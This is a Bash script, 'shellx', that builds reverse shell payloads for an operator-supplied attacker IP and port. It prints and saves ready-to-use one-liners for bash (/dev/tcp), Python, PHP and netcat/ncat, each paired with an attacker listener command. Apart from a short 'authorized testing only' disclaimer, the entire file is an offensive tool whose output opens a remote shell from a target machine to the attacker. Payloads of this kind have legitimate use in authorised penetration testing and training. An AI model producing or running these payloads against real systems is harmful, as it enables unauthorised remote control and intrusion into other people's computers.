#!/usr/bin/env bash

RED='\033[1;31m'
GREEN='\033[1;32m'
CYAN='\033[1;36m'
YELLOW='\033[1;33m'
RESET='\033[0m'

RESULTS_FILE="shellx_payloads_$(date +%Y%m%d_%H%M%S).txt"

show_banner() {
    clear 2>/dev/null || true
    echo -e "${RED}"
    echo "    ███████╗██╗  ██╗███████╗██╗     ██╗  ██╗"
    echo "    ██╔════╝██║  ██║██╔════╝██║     ██║  ██║"
    echo "    ███████╗███████║█████╗  ██║     ███████║"
    echo "    ╚════██║██╔══██║██╔══╝  ██║     ██╔══██║"
    echo "    ███████║██║  ██║███████╗███████╗██║  ██║"
    echo "    ╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚═╝  ╚═╝"
    echo -e "${GREEN}"
    echo "    ╔══════════════════════════════════════╗"
    echo "    ║   Shell & Payload Generator  v1.0    ║"
    echo "    ╚══════════════════════════════════════╝"
    echo -e "${RESET}"
}

show_disclaimer() {
    echo -e "${RED}╔════════════════════════════════════════════════════╗${RESET}"
    echo -e "${RED}║  DISCLAIMER: Use at your own risk.                ║${RESET}"
    echo -e "${RED}║  Developer(s) assume NO liability.                ║${RESET}"
    echo -e "${RED}║  For authorized security testing ONLY.            ║${RESET}"
    echo -e "${RED}╚════════════════════════════════════════════════════╝${RESET}"
}

show_help() {
    echo -e "${CYAN}USAGE:${RESET}"
    echo "  ./shellx.sh [option] [LHOST] [LPORT]"
    echo ""
    echo -e "${CYAN}OPTIONS:${RESET}"
    echo "  -bash     Generate Bash reverse shell payload"
    echo "  -python   Generate Python reverse shell payload"
    echo "  -php      Generate PHP reverse shell payload"
    echo "  -nc       Generate Netcat reverse shell payload"
    echo "  -all      Generate all payloads"
    echo "  -h, --help  Show this help message"
    echo ""
    echo -e "${CYAN}EXAMPLES:${RESET}"
    echo "  ./shellx.sh -bash 10.0.0.5 4444"
    echo "  ./shellx.sh -all 10.0.0.5 4444"
    echo ""
    show_disclaimer
}

generate_bash() {
    local lhost="$1"
    local lport="$2"
    echo ""
    echo -e "${GREEN}═══ Bash Reverse Shell ═══${RESET}"
    echo -e "${YELLOW}# Target command:${RESET}"
    echo "bash -i >& /dev/tcp/$lhost/$lport 0>&1"
    echo ""
    echo -e "${YELLOW}# Attacker listener:${RESET}"
    echo "nc -lvnp $lport"
    echo ""

    echo "### BASH REVERSE SHELL ###" >> "$RESULTS_FILE"
    echo "bash -i >& /dev/tcp/$lhost/$lport 0>&1" >> "$RESULTS_FILE"
    echo "" >> "$RESULTS_FILE"
}

generate_python() {
    local lhost="$1"
    local lport="$2"
    echo ""
    echo -e "${GREEN}═══ Python Reverse Shell ═══${RESET}"
    echo -e "${YELLOW}# Target command:${RESET}"
    echo "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$lhost\",$lport));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'"
    echo ""
    echo -e "${YELLOW}# Attacker listener:${RESET}"
    echo "nc -lvnp $lport"
    echo ""

    echo "### PYTHON REVERSE SHELL ###" >> "$RESULTS_FILE"
    echo "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$lhost\",$lport));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'" >> "$RESULTS_FILE"
    echo "" >> "$RESULTS_FILE"
}

generate_php() {
    local lhost="$1"
    local lport="$2"
    echo ""
    echo -e "${GREEN}═══ PHP Reverse Shell ═══${RESET}"
    echo -e "${YELLOW}# Target command:${RESET}"
    echo "php -r '\$sock=fsockopen(\"$lhost\",$lport);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
    echo ""
    echo -e "${YELLOW}# Attacker listener:${RESET}"
    echo "nc -lvnp $lport"
    echo ""

    echo "### PHP REVERSE SHELL ###" >> "$RESULTS_FILE"
    echo "php -r '\$sock=fsockopen(\"$lhost\",$lport);exec(\"/bin/sh -i <&3 >&3 2>&3\");'" >> "$RESULTS_FILE"
    echo "" >> "$RESULTS_FILE"
}

generate_nc() {
    local lhost="$1"
    local lport="$2"
    echo ""
    echo -e "${GREEN}═══ Netcat Reverse Shell ═══${RESET}"
    echo -e "${YELLOW}# Target command (traditional):${RESET}"
    echo "nc -e /bin/sh $lhost $lport"
    echo ""
    echo -e "${YELLOW}# Target command (ncat variant):${RESET}"
    echo "ncat -e /bin/sh $lhost $lport"
    echo ""
    echo -e "${YELLOW}# Attacker listener:${RESET}"
    echo "nc -lvnp $lport"
    echo ""

    echo "### NETCAT REVERSE SHELL ###" >> "$RESULTS_FILE"
    echo "nc -e /bin/sh $lhost $lport" >> "$RESULTS_FILE"
    echo "" >> "$RESULTS_FILE"
}

generate_all() {
    local lhost="$1"
    local lport="$2"
    echo -e "${CYAN}[*] Generating all payloads...${RESET}"
    > "$RESULTS_FILE"
    generate_bash "$lhost" "$lport"
    generate_python "$lhost" "$lport"
    generate_php "$lhost" "$lport"
    generate_nc "$lhost" "$lport"
    echo -e "${GREEN}[+] All payloads saved to $RESULTS_FILE${RESET}"
}

interactive_menu() {
    local lhost=""
    local lport=""

    while true; do
        show_banner
        show_disclaimer
        echo ""

        if [ -z "$lhost" ]; then
            read -p "$(echo -e ${YELLOW}"[>] LHOST (your IP): "${RESET})" lhost
        fi
        if [ -z "$lport" ]; then
            read -p "$(echo -e ${YELLOW}"[>] LPORT (listener port): "${RESET})" lport
        fi

        echo -e "${CYAN}LHOST: ${GREEN}$lhost${RESET}  LPORT: ${GREEN}$lport${RESET}"
        echo ""
        echo -e "${CYAN}1) Bash reverse shell${RESET}"
        echo -e "${CYAN}2) Python reverse shell${RESET}"
        echo -e "${CYAN}3) PHP reverse shell${RESET}"
        echo -e "${CYAN}4) Netcat reverse shell${RESET}"
        echo -e "${CYAN}5) All payloads${RESET}"
        echo -e "${CYAN}6) Change LHOST/LPORT${RESET}"
        echo -e "${CYAN}7) Help${RESET}"
        echo -e "${CYAN}8) Exit${RESET}"
        echo ""
        read -p "$(echo -e ${YELLOW}"[>] Choose an option [1-8]: "${RESET})" choice

        case "$choice" in
            1) generate_bash "$lhost" "$lport" ;;
            2) generate_python "$lhost" "$lport" ;;
            3) generate_php "$lhost" "$lport" ;;
            4) generate_nc "$lhost" "$lport" ;;
            5) generate_all "$lhost" "$lport" ;;
            6) lhost=""; lport="" ;;
            7) show_help ;;
            8)
                echo -e "${GREEN}[+] Exiting. Stay secure.${RESET}"
                exit 0
                ;;
            *) echo -e "${RED}[!] Invalid option${RESET}"; sleep 1 ;;
        esac

        echo ""
        echo -e "${CYAN}[*] Press Enter to continue...${RESET}"
        read -r
    done
}

main() {
    show_disclaimer
    echo ""

    if [ $# -eq 0 ]; then
        interactive_menu
    elif [ $# -lt 3 ] && [ "$1" != "-h" ] && [ "$1" != "--help" ]; then
        echo -e "${RED}[!] Usage: $0 <option> <LHOST> <LPORT>${RESET}"
        show_help
        exit 1
    else
        case "$1" in
            -bash)   generate_bash "$2" "$3" ;;
            -python) generate_python "$2" "$3" ;;
            -php)    generate_php "$2" "$3" ;;
            -nc)     generate_nc "$2" "$3" ;;
            -all)    generate_all "$2" "$3" ;;
            -h|--help) show_help ;;
            *)
                echo -e "${RED}[!] Unknown option: $1${RESET}"
                show_help
                exit 1
                ;;
        esac
    fi
}

main "$@"
